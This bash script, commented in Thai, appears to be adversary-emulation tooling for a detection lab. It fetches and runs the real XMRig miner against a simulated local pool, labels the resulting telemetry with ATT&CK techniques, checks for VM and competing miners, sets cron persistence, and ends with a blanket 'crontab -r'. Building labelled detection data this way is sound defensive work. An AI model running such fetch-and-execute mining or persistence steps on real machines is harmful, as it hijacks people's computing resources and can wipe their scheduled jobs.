#!/usr/bin/env bash
# miner_real.sh - cryptominer พฤติกรรมจริงด้วย XMRig
#
# ต่างจาก miner.sh (ART): ตัวนี้รัน XMRig ของจริง -> ได้ลายเซ็นที่ ART จำลองไม่ได้
#   - RandomX dataset allocation (~2GB) + huge pages
#   - stratum protocol จริง (login/job/submit share) กับ mining_pool.py พอร์ต 3333
#   - CPU pinning หลาย thread
# ไม่ได้ขุดเงินจริง - pool เป็นตัวจำลอง blob สุ่ม ไม่เชื่อมบล็อกเชนใดๆ
#
# labeling: XMRig ถูก spawn จาก $SANDBOX (seed) -> lineage จับเป็น malicious
#
# ATT&CK:
#   T1496  Resource Hijacking (ของจริง ไม่ใช่ yes/bc)
#   T1082  4,5   System Information Discovery (miner เช็คสเปกก่อนขุด)
#   T1057  1     Process Discovery (หา miner คู่แข่ง)
#   T1053.003 1,2  Cron persistence
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
banner "miner_real"
setup_sandbox

POOL_HOST="${POOL_HOST:-192.168.56.1}"
POOL_PORT="${POOL_PORT:-3333}"
XMRIG_URL="${XMRIG_URL:-https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz}"
MINE="$SANDBOX/miner"
mkdir -p "$MINE"

# --- Stage 1: เช็คว่าอยู่ใน VM/sandbox ไหม (พฤติกรรมเด่นของ miner จริง) ---
atomic T1082 4,5

# --- Stage 2: สำรวจทรัพยากร (miner จริงเช็คสเปกก่อนตัดสินใจ thread) ---
echo "[miner_real] ตรวจสเปกเครื่อง"
nproc              > "$MINE/cpu_count.txt"
cat /proc/cpuinfo  > "$MINE/cpuinfo.txt"
free -m            > "$MINE/memory.txt"
lscpu 2>/dev/null  > "$MINE/lscpu.txt"

# --- Stage 3: หา process คู่แข่ง (miner จริงฆ่า miner ตัวอื่นทิ้ง) ---
atomic T1057 1
ps aux | grep -iE 'xmrig|minerd|cpuminer|kdevtmpfsi|kinsing' | grep -v grep \
       > "$MINE/competitors.txt" || true

# --- Stage 4: ดาวน์โหลด XMRig เข้ามาใน sandbox (T1105 ingress tool transfer) ---
echo "[miner_real] ดาวน์โหลด XMRig"
if [ ! -x "$MINE/xmrig" ]; then
    noprompt curl -sL -m 90 -o "$MINE/xmrig.tar.gz" "$XMRIG_URL"
    tar xzf "$MINE/xmrig.tar.gz" -C "$MINE" --strip-components=1 2>/dev/null \
        || tar xzf "$MINE/xmrig.tar.gz" -C "$MINE" 2>/dev/null
    # หา binary ให้เจอไม่ว่าจะ strip หรือไม่
    BIN="$(find "$MINE" -name xmrig -type f -perm -u+x | head -1)"
    [ -n "$BIN" ] && cp "$BIN" "$MINE/xmrig" 2>/dev/null || true
    chmod +x "$MINE/xmrig" 2>/dev/null || true
fi

if [ ! -x "$MINE/xmrig" ]; then
    echo "[!] โหลด/แตก XMRig ไม่สำเร็จ - ข้าม (ตรวจเน็ต NAT)"
else
    # --- Stage 5: ขุดจริง 90 วินาที ---
    # --background ให้ xmrig daemonize เอง, จำกัดเวลาด้วย timeout กัน CPU ค้าง
    echo "[miner_real] เริ่มขุด (XMRig -> $POOL_HOST:$POOL_PORT)"
    timeout 90 "$MINE/xmrig" \
        -o "$POOL_HOST:$POOL_PORT" \
        -u "lab_worker_$(hostname)" -p x \
        --coin monero --no-color \
        --threads 2 --cpu-max-threads-hint 100 \
        --donate-level 0 \
        > "$MINE/xmrig_run.log" 2>&1 || true
    echo "[miner_real] จบการขุด - $(grep -c accepted "$MINE/xmrig_run.log" 2>/dev/null || echo 0) share accepted"
fi

# --- Stage 6: persistence ผ่าน cron (miner จริงตั้ง cron ให้ตัวเองกลับมา) ---
atomic T1053.003 1,2

# --- cleanup ---
crontab -r 2>/dev/null || true
atomic_cleanup T1053.003 1,2
done_banner "miner_real"
